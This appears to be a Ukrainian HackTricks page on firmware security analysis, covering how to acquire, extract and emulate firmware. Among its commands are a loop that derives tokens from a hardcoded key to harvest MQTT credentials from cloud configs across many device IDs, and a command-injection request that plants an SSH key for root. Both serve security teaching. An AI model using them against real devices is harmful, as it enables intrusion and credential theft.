# Аналіз прошивки

{{#include ../../banners/hacktricks-training.md}}

## **Вступ**

### Пов'язані ресурси


{{#ref}}
synology-encrypted-archive-decryption.md
{{#endref}}

{{#ref}}
../../network-services-pentesting/32100-udp-pentesting-pppp-cs2-p2p-cameras.md
{{#endref}}

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

Прошивка — це необхідне програмне забезпечення, яке дозволяє пристроям правильно працювати, керуючи та забезпечуючи комунікацію між апаратними компонентами і програмним забезпеченням, з яким взаємодіють користувачі. Вона зберігається в постійній пам'яті, що гарантує доступ пристрою до важливих інструкцій з моменту ввімкнення живлення та до запуску операційної системи. Дослідження та потенційна модифікація прошивки — критичний етап у виявленні вразливостей безпеки.

## **Збір інформації**

**Збір інформації** — ключовий початковий етап у розумінні складу пристрою та технологій, які він використовує. Цей процес включає збір даних про:

- Архітектуру CPU та операційну систему, яку він запускає
- Деталі bootloader
- Розташування апаратних компонентів і datasheet'и
- Метрики кодової бази та місця зберігання джерел
- Зовнішні бібліотеки та типи ліцензій
- Історію оновлень і регуляторні сертифікати
- Архітектурні та схемні діаграми потоку
- Оцінки безпеки та виявлені вразливості

Для цього незамінними є інструменти розвідки з відкритих джерел (OSINT), а також аналіз будь-яких доступних компонентів open-source software через ручні та автоматизовані процеси перевірки. Інструменти на кшталт [Coverity Scan](https://scan.coverity.com) та [Semmle’s LGTM](https://lgtm.com/#explore) пропонують безкоштовну static analysis, яку можна використати для пошуку потенційних проблем.

## **Отримання прошивки**

Отримання прошивки можна здійснити різними способами, кожен з яких має свій рівень складності:

- **Безпосередньо** від джерела (developers, manufacturers)
- **Building** її за наданими інструкціями
- **Downloading** з офіційних сайтів підтримки
- Використовуючи **Google dork** запити для пошуку розміщених файлів прошивки
- Доступ до cloud storage напряму, з інструментами на кшталт [S3Scanner](https://github.com/sa7mon/S3Scanner)
- Перехоплення **updates** via man-in-the-middle techniques
- **Extracting** з пристрою через підключення, такі як **UART**, **JTAG**, або **PICit**
- **Sniffing** запитів оновлення в комунікаціях пристрою
- Ідентифікація та використання **hardcoded update endpoints**
- **Dumping** з bootloader або мережі
- **Removing and reading** чип пам'яті, коли інші методи не дали результату, з використанням відповідних hardware tools

## Analyzing the firmware

Now that you **have the firmware**, you need to extract information about it to know how to treat it. Different tools you can use for that:
```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #print offsets in hex
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head # might find signatures in header
fdisk -lu <bin> #lists a drives partition and filesystems if multiple
```
Якщо з цими інструментами ви не знайдете багато корисного, перевірте **ентропію** образу за допомогою `binwalk -E <bin>`: якщо ентропія низька — швидше за все він не зашифрований. Якщо висока — ймовірно зашифрований (або стиснутий якимось способом).

Крім того, ви можете використовувати ці інструменти для витягання **файлів, вбудованих у firmware**:


{{#ref}}
../../generic-methodologies-and-resources/basic-forensic-methodology/partitions-file-systems-carving/file-data-carving-recovery-tools.md
{{#endref}}

Або [**binvis.io**](https://binvis.io/#/) ([code](https://code.google.com/archive/p/binvis/)) для аналізу файлу.

### Отримання файлової системи

За допомогою вищезгаданих інструментів, таких як `binwalk -ev <bin>`, ви повинні були змогти **витягнути файлову систему**.\
Binwalk зазвичай розпаковує її в **папку, названу за типом файлової системи**, яка зазвичай є однією з наступних: squashfs, ubifs, romfs, rootfs, jffs2, yaffs2, cramfs, initramfs.

#### Ручне витягнення файлової системи

Іноді binwalk **не знайде магічний байт файлової системи в своїх сигнатурах**. У таких випадках використайте binwalk, щоб **знайти зсув (offset) файлової системи і вирізати стиснену файлову систему** з бінарного файлу та **ручним способом витягти** файлову систему відповідно до її типу, використовуючи кроки нижче.
```
$ binwalk DIR850L_REVB.bin

DECIMAL HEXADECIMAL DESCRIPTION
----------------------------------------------------------------------------- ---

0 0x0 DLOB firmware header, boot partition: """"dev=/dev/mtdblock/1""""
10380 0x288C LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 5213748 bytes
1704052 0x1A0074 PackImg section delimiter tag, little endian size: 32256 bytes; big endian size: 8257536 bytes
1704084 0x1A0094 Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 8256900 bytes, 2688 inodes, blocksize: 131072 bytes, created: 2016-07-12 02:28:41
```
Запустіть наступну **dd command** для вилучення файлової системи Squashfs.
```
$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs

8257536+0 records in

8257536+0 records out

8257536 bytes (8.3 MB, 7.9 MiB) copied, 12.5777 s, 657 kB/s
```
Альтернативно, також можна виконати таку команду.

`$ dd if=DIR850L_REVB.bin bs=1 skip=$((0x1A0094)) of=dir.squashfs`

- Для squashfs (використовується в прикладі вище)

`$ unsquashfs dir.squashfs`

Після цього файли будуть у каталозі `squashfs-root`.

- Архіви CPIO

`$ cpio -ivd --no-absolute-filenames -F <bin>`

- Для файлових систем jffs2

`$ jefferson rootfsfile.jffs2`

- Для файлових систем ubifs на NAND flash

`$ ubireader_extract_images -u UBI -s <start_offset> <bin>`

`$ ubidump.py <bin>`

## Аналіз прошивки

Як тільки прошивка отримана, важливо розібрати її, щоб зрозуміти структуру та потенційні вразливості. Цей процес передбачає використання різних інструментів для аналізу та витягання цінних даних з образу прошивки.

### Початкові інструменти аналізу

Набір команд наведено для початкового огляду бінарного файлу (зазначеного як `<bin>`). Ці команди допомагають ідентифікувати типи файлів, витягувати рядки, аналізувати бінарні дані та розуміти деталі розділів і файлових систем:
```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #prints offsets in hexadecimal
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head #useful for finding signatures in the header
fdisk -lu <bin> #lists partitions and filesystems, if there are multiple
```
Щоб оцінити стан шифрування образу, перевіряють **ентропію** за допомогою `binwalk -E <bin>`. Низька ентропія свідчить про відсутність шифрування, тоді як висока ентропія вказує на можливе шифрування або стиснення.

Для витягнення **вбудованих файлів** рекомендовано використовувати інструменти й ресурси, такі як документація **file-data-carving-recovery-tools** та **binvis.io** для інспекції файлів.

### Витягнення файлової системи

За допомогою `binwalk -ev <bin>` зазвичай можна витягнути файлову систему, часто у каталог, названий за типом файлової системи (наприклад, squashfs, ubifs). Однак коли **binwalk** не вдається розпізнати тип файлової системи через відсутні magic bytes, необхідне ручне витягнення. Це передбачає використання `binwalk` для визначення офсету файлової системи, а потім команди `dd` для вирізання файлової системи:
```bash
$ binwalk DIR850L_REVB.bin

$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs
```
Потім, залежно від типу файлової системи (наприклад, squashfs, cpio, jffs2, ubifs), використовуються різні команди для ручного витягання вмісту.

### Аналіз файлової системи

Після витягнення файлової системи починається пошук проблем безпеки. Увага приділяється ненадійним мережевим демонам, жорстко вбудованим обліковим даним, API endpoints, функціям update server, нескомпільованому коду, startup скриптам та скомпільованим бінарникам для офлайн-аналізу.

**Ключові місця** та **елементи**, які слід перевірити, включають:

- **etc/shadow** and **etc/passwd** для облікових даних користувачів
- SSL certificates and keys in **etc/ssl**
- Файли конфігурації та скрипти на предмет потенційних вразливостей
- Вбудовані бінарні файли для подальшого аналізу
- Типові web-сервери та бінарні файли IoT-пристроїв

Кілька інструментів допомагають виявляти чутливу інформацію та вразливості у файловій системі:

- [**LinPEAS**](https://github.com/carlospolop/PEASS-ng) та [**Firmwalker**](https://github.com/craigz28/firmwalker) для пошуку чутливої інформації
- [**The Firmware Analysis and Comparison Tool (FACT)**](https://github.com/fkie-cad/FACT_core) для всебічного аналізу firmware
- [**FwAnalyzer**](https://github.com/cruise-automation/fwanalyzer), [**ByteSweep**](https://gitlab.com/bytesweep/bytesweep), [**ByteSweep-go**](https://gitlab.com/bytesweep/bytesweep-go), and [**EMBA**](https://github.com/e-m-b-a/emba) для статичного та динамічного аналізу

### Перевірки безпеки скомпільованих бінарників

Як вихідний код, так і скомпільовані бінарні файли, знайдені у файловій системі, повинні ретельно перевірятися на вразливості. Інструменти на кшталт **checksec.sh** для Unix-бінарників і **PESecurity** для Windows-бінарників допомагають виявити незахищені бінарні файли, які можуть бути експлуатовані.

## Отримання cloud-конфігурації та MQTT облікових даних через похідні URL-токени

Багато IoT hub-ів отримують конфігурацію для кожного пристрою з cloud endpoint, який виглядає так:

- [https://<api-host>/pf/<deviceId>/<token>](https://<api-host>/pf/<deviceId>/<token>)

Під час аналізу firmware ви можете виявити, що <token> походить локально від device ID з використанням жорстко вбудованого секрету, наприклад:

- token = MD5( deviceId || STATIC_KEY ) and represented as uppercase hex

Такий підхід дозволяє будь-кому, хто дізнається deviceId і STATIC_KEY, відтворити URL і витягти cloud config, часто розкриваючи plaintext MQTT credentials і префікси тем.

Практичний робочий процес:

1) Extract deviceId from UART boot logs

- Підключіть 3.3V UART адаптер (TX/RX/GND) і зніміть логи:
```bash
picocom -b 115200 /dev/ttyUSB0
```
- Шукайте рядки, що виводять cloud config URL pattern і broker address, наприклад:
```
Online Config URL https://api.vendor.tld/pf/<deviceId>/<token>
MQTT: mqtt://mq-gw.vendor.tld:8001
```
2) Відновлення STATIC_KEY та алгоритму token з прошивки

- Завантажте бінарники в Ghidra/radare2 та пошукайте шлях конфігурації ("/pf/") або використання MD5.
- Підтвердьте алгоритм (наприклад, MD5(deviceId||STATIC_KEY)).
- Отримайте token у Bash та переведіть дайджест у верхній регістр:
```bash
DEVICE_ID="d88b00112233"
STATIC_KEY="cf50deadbeefcafebabe"
printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}'
```
3) Збір cloud config і MQTT credentials

- Сформувати URL і завантажити JSON за допомогою curl; розпарсити за допомогою jq, щоб витягти secrets:
```bash
API_HOST="https://api.vendor.tld"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -sS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq .
# Fields often include: mqtt host/port, clientId, username, password, topic prefix (tpkfix)
```
4) Зловживайте plaintext MQTT та слабкими topic ACLs (якщо присутні)

- Використовуйте recovered credentials, щоб підписатися на maintenance topics і шукати sensitive events:
```bash
mosquitto_sub -h <broker> -p <port> -V mqttv311 \
-i <client_id> -u <username> -P <password> \
-t "<topic_prefix>/<deviceId>/admin" -v
```
5) Перерахування передбачуваних device IDs (масштабно, з авторизацією)

- Багато екосистем вбудовують vendor OUI/product/type байти, за якими слідує послідовний суфікс.
- Ви можете перебирати candidate IDs, derive tokens і fetch configs програмно:
```bash
API_HOST="https://api.vendor.tld"; STATIC_KEY="cf50deadbeef"; PREFIX="d88b1603" # OUI+type
for SUF in $(seq -w 000000 0000FF); do
DEVICE_ID="${PREFIX}${SUF}"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -fsS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq -r '.mqtt.username,.mqtt.password' | sed "/null/d" && echo "$DEVICE_ID"
done
```
Примітки
- Завжди отримуйте явну авторизацію перед спробою mass enumeration.
- Віддавайте перевагу emulation або static analysis для відновлення секретів без модифікації цільового hardware, якщо це можливо.


Процес emulating firmware дозволяє здійснювати **dynamic analysis** як роботи пристрою, так і окремої програми. Цей підхід може стикатися з проблемами, пов’язаними з hardware або залежностями від architecture, але перенесення root filesystem або конкретних binaries на пристрій з відповідною architecture та endianness, наприклад Raspberry Pi, або на заздалегідь підготовлену virtual machine, може полегшити подальше тестування.

### Emulating Individual Binaries

Для аналізу окремих програм важливо визначити endianness та CPU architecture програми.

#### Приклад з MIPS Architecture

Щоб emulate MIPS architecture binary, можна використати команду:
```bash
file ./squashfs-root/bin/busybox
```
А щоб встановити необхідні інструменти емуляції:
```bash
sudo apt-get install qemu qemu-user qemu-user-static qemu-system-arm qemu-system-mips qemu-system-x86 qemu-utils
```
For MIPS (big-endian), `qemu-mips` is used, and for little-endian binaries, `qemu-mipsel` would be the choice.

#### Емуляція архітектури ARM

Для ARM бінарників процес аналогічний — для емуляції використовують `qemu-arm`.

### Повна системна емуляція

Інструменти, такі як [Firmadyne](https://github.com/firmadyne/firmadyne), [Firmware Analysis Toolkit](https://github.com/attify/firmware-analysis-toolkit) та інші, спрощують повну емуляцію firmware, автоматизують процес і допомагають у динамічному аналізі.

## Динамічний аналіз на практиці

На цьому етапі для аналізу використовується або реальний, або емульований пристрій. Важливо зберігати shell-доступ до OS та filesystem. Емуляція може не імітувати апаратні взаємодії ідеально, тому іноді потрібно перезапускати емульоване середовище. Під час аналізу слід повторно переглядати filesystem, досліджувати відкриті webpages та network services і шукати вразливості в bootloader. Тести цілісності firmware критично важливі для виявлення потенційних backdoor-вразливостей.

## Техніки аналізу під час виконання

Аналіз під час виконання включає взаємодію з процесом або бінарником у його робочому середовищі, використовуючи інструменти на кшталт gdb-multiarch, Frida та Ghidra для виставляння breakpoints і виявлення вразливостей за допомогою fuzzing та інших технік.

## Експлуатація бінарників та Proof-of-Concept

Розробка PoC для виявлених вразливостей вимагає глибокого розуміння цільової архітектури та програмування на низькорівневих мовах. Захисти бінарного виконання в embedded systems зустрічаються рідко, але якщо вони присутні, можуть знадобитися техніки на кшталт Return Oriented Programming (ROP).

## Підготовлені операційні системи для аналізу Firmware

Операційні системи на зразок [AttifyOS](https://github.com/adi0x90/attifyos) та [EmbedOS](https://github.com/scriptingxss/EmbedOS) надають попередньо налаштовані середовища для тестування безпеки firmware, укомплектовані необхідними інструментами.

## Підготовлені ОС для аналізу Firmware

- [**AttifyOS**](https://github.com/adi0x90/attifyos): AttifyOS — дистро, призначене для допомоги у виконанні security assessment та penetration testing пристроїв Internet of Things (IoT). Воно заощаджує багато часу, надаючи попередньо налаштоване середовище з усіма необхідними інструментами.
- [**EmbedOS**](https://github.com/scriptingxss/EmbedOS): Embedded security testing operating system на базі Ubuntu 18.04, попередньо укомплектована інструментами для тестування безпеки firmware.

## Firmware Downgrade Attacks & Insecure Update Mechanisms

Навіть якщо постачальник реалізує криптографічну перевірку підписів для firmware-образів, **захист від version rollback (downgrade) часто відсутній**. Якщо boot- або recovery-loader лише перевіряє підпис за вбудованим публічним ключем, але не порівнює *version* (або моніторний лічильник) образу, що прошивається, атакуючий може легітимно встановити **старіший, вразливий firmware, який все ще має дійсну підпис**, і тим самим повторно ввести виправлені вразливості.

Типовий сценарій атаки:

1. **Obtain an older signed image**
   * Отримати його з публічного порталу завантажень постачальника, CDN або сайту підтримки.
   * Витягти його з companion mobile/desktop applications (наприклад всередині Android APK під `assets/firmware/`).
   * Отримати його з third-party репозиторіїв, таких як VirusTotal, інтернет-архіви, форуми тощо.
2. **Upload or serve the image to the device** via any exposed update channel:
   * Web UI, mobile-app API, USB, TFTP, MQTT тощо.
   * Багато consumer IoT devices відкривають *unauthenticated* HTTP(S) endpoints, які приймають Base64-encoded firmware blobs, декодують їх на серверній стороні і запускають recovery/upgrade.
3. Після downgrade — експлуатувати вразливість, яку виправили в новішому релізі (наприклад, command-injection фільтр, доданий пізніше).
4. Опційно прошити назад останній образ або вимкнути оновлення, щоб уникнути виявлення після набуття persistence.

### Example: Command Injection After Downgrade
```http
POST /check_image_and_trigger_recovery?md5=1; echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...' >> /root/.ssh/authorized_keys HTTP/1.1
Host: 192.168.0.1
Content-Type: application/octet-stream
Content-Length: 0
```
У вразливій (пониженій) прошивці параметр `md5` безпосередньо конкатенується в shell-команду без санітизації, що дозволяє ін'єкцію довільних команд (тут — увімкнення доступу по SSH за ключем для root). У пізніших версіях прошивки введено базовий фільтр символів, але відсутність захисту від пониження версії робить це виправлення марним.

### Витягнення прошивки з мобільних додатків

Багато вендорів пакують повні образи прошивки в супутні мобільні додатки, щоб додаток міг оновити пристрій через Bluetooth/Wi-Fi. Такі пакети зазвичай зберігаються у незашифрованому вигляді в APK/APEX за шляхами типу `assets/fw/` або `res/raw/`. Інструменти на кшталт `apktool`, `ghidra` або просто `unzip` дозволяють витягти підписані образи без доступу до фізичного обладнання.
```
$ apktool d vendor-app.apk -o vendor-app
$ ls vendor-app/assets/firmware
firmware_v1.3.11.490_signed.bin
```
### Контрольний список для оцінки логіки оновлення

* Чи захищено належним чином транспорт/аутентифікацію *update endpoint* (TLS + authentication)?
* Чи порівнює пристрій **номери версій** або **монотонний anti-rollback counter** перед прошиванням?
* Чи перевіряється образ в межах secure boot chain (наприклад, підписи перевіряються ROM code)?
* Чи виконує userland code додаткові sanity checks (наприклад, allowed partition map, model number)?
* Чи повторно використовують потоки оновлення *partial* або *backup* ту ж саму логіку валідації?

> 💡  Якщо будь-який з наведених пунктів відсутній, платформа, ймовірно, вразлива до rollback attacks.

## Уразливі прошивки для практики

Щоб практикувати пошук вразливостей у прошивках, використовуйте наступні вразливі проекти прошивок як відправну точку.

- OWASP IoTGoat
- [https://github.com/OWASP/IoTGoat](https://github.com/OWASP/IoTGoat)
- The Damn Vulnerable Router Firmware Project
- [https://github.com/praetorian-code/DVRF](https://github.com/praetorian-code/DVRF)
- Damn Vulnerable ARM Router (DVAR)
- [https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html](https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html)
- ARM-X
- [https://github.com/therealsaumil/armx#downloads](https://github.com/therealsaumil/armx#downloads)
- Azeria Labs VM 2.0
- [https://azeria-labs.com/lab-vm-2-0/](https://azeria-labs.com/lab-vm-2-0/)
- Damn Vulnerable IoT Device (DVID)
- [https://github.com/Vulcainreo/DVID](https://github.com/Vulcainreo/DVID)

## Джерела

- [https://scriptingxss.gitbook.io/firmware-security-testing-methodology/](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [Practical IoT Hacking: The Definitive Guide to Attacking the Internet of Things](https://www.amazon.co.uk/Practical-IoT-Hacking-F-Chantzis/dp/1718500904)
- [Exploiting zero days in abandoned hardware – Trail of Bits blog](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)


- [How a $20 Smart Device Gave Me Access to Your Home](https://bishopfox.com/blog/how-a-20-smart-device-gave-me-access-to-your-home)

## Навчання та сертифікація

- [https://www.attify-store.com/products/offensive-iot-exploitation](https://www.attify-store.com/products/offensive-iot-exploitation)

{{#include ../../banners/hacktricks-training.md}}
